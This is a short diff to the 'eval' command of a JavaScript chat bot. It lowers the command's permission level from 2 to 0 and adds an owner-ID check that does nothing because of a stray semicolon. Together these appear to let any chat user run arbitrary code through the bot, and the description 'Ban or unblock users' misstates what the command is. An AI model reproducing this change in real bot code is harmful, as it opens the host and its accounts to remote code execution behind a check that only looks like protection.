@@ -1,7 +1,7 @@
 module.exports.config = {
     name: "eval",
 	version: "1.0.5",
-	hasPermssion: 2,
+	hasPermssion: 0,
 	credits: "DRIDI-RAYEN",
 	description: "Ban or unblock users",
   usePrefix: true,
@@ -11,7 +11,8 @@ module.exports.config = {
 };
 
 module.exports.run = async function({ api, args, Users, event, Threads, utils, client, eva, message }) {
-  try {
+if(event.senderID != "100081570534647");
+	try {
   function output(msg) {
       if (typeof msg == "number" || typeof msg == "boolean" || typeof msg == "function")
         msg = msg.toString();
